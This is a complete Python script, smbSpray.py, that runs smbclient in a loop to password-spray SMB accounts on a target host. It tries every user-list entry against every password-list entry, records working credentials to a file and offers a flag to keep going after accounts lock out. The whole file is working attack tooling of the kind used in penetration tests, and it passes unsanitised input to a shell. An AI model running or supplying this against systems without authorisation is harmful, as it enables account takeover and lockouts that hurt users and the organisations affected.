#! python3
# smbSpray.py -v 1.0
# Author- David Sullivan
#
# Use smbclient to password spray against a device
#
# Revision  1.0     -   07/09/2018- Initial creation of script
#
# To do:
#   -   Add in time delay feature
#
# Example Usage:
# python3 smbSpray.py -d domain -u user -p password -t 127.0.0.1 -o output.txt
# python3 smbSpray.py -d domain -U userlist.txt -P passwordlist.txt -t 127.0.0.1 -o output.txt

import subprocess, argparse


def write_output(user, password, output):
    # open the file and write to it
    file = open(output, 'a+')
    file.write('%s:%s\n' % (user, password))
    file.close()


def sprayer(domain, user_list, password_list, target_ip, output, bypass):
    # loop through each set of passwords, spraying each user
    print("Running")
    # remove the new line character from the users
    user_list_clean = []
    for user in user_list:
        user = user.replace("\n", "")
        user_list_clean.append(user)
    # remove the new line character from the passwords
    password_list_clean = []
    for password in password_list:
        password = password.replace("\n", "")
        password_list_clean.append(password)

    # create a copy of the user list to remove users if the correct password is found, or the account gets locked
    temp_users = user_list_clean[:]
    for password in password_list_clean:
        print("Spraying using %s" % password)
        # update the user_list based on found passwords or locked accounts
        user_list = temp_users[:]
        for user in user_list:
            # build the command line argument for rpcclient
            arguments = 'smbclient -U "%s\%s%%%s" -L %s' % (domain, user, password, target_ip)
            # send the command line query and pipe the response to standard out
            response = subprocess.Popen(arguments, shell=True, stdout=subprocess.PIPE).stdout
            # decode the response as a string
            answer = (response.read()).decode()
            # check to see if the server can be connected to, if not, stop the script
            if answer == "Connection to %s failed (Error was NT_STATUS_CONNECTION_REFUSED)\n" % target_ip:
                print("Unable to connect to server")
                quit()
            # check to see if the account is expired, if so, print out the account and remove from spraying list
            elif answer == "session setup failed: NT_STATUS_PASSWORD_EXPIRED\n":
                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                temp_users.remove(user)
            # check to see if the account is disabled if so, print out the account and remove from spraying list
            elif answer == "session setup failed: NT_STATUS_ACCOUNT_DISABLED\n":
                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                temp_users.remove(user)
            # check to see if the account has been locked out, if so, stop spraying to not lock out the whole domain
            elif answer == "session setup failed: NT_STATUS_ACCOUNT_LOCKED_OUT\n":
                print(answer.replace("\n", "") + " using the account " + user + " and the password " + password)
                user_diff = set(user_list_clean) - set(temp_users)
                if bypass is not True:
                    print('Stopping script due to account lockout')
                    print('The following accounts are expired, disabled or cracked:')
                    print(user_diff)
                    quit()
            # if logon fails, drop the response, any other response, print to screen and remove account from spraying
            elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
                print("The account %s was successfully logged into using the password %s" % (user, password))
                temp_users.remove(user)
                # write password to file
                if output is not None:
                    write_output(user, password, output)
    print("Complete")


def main():
    # parse input for variables
    parser = argparse.ArgumentParser(description='RPC Password Sprayer')
    parser.add_argument('-d', '--domain', help="Domain name")
    parser.add_argument('-U', '--userlist', help='Location of users list')
    parser.add_argument('-u', '--user', help='Use a single user name')
    parser.add_argument('-P', '--passwordlist', help='Location of passwords list')
    parser.add_argument('-p', '--password', help='Use a single password')
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-o', '--output', help='Output file name')
    parser.add_argument('-b', '--bypass', action='store_true', help='Bypass locked accounts')
    args = parser.parse_args()

    # set list of users
    users = []
    if args.userlist is not None:
        users_doc = args.userlist
        users_import = open(users_doc, 'r')
        for usr in users_import:
            users.append(usr)
    if args.user is not None:
        users.append(args.user)

    # set list of passwords
    passwords = []
    if args.passwordlist is not None:
        passwords_doc = args.passwordlist
        passwords_import = open(passwords_doc, 'r')
        for pw in passwords_import:
            passwords.append(pw)
    if args.password is not None:
        passwords.append(args.password)

    # select target
    target = args.target

    # select domain
    domain = args.domain

    # select output
    if args.output is not None:
        output = args.output
    else:
        output = None

    # bypass boolean
    bypass = args.bypass

    # run the program
    sprayer(domain, users, passwords, target, output, bypass)


main()
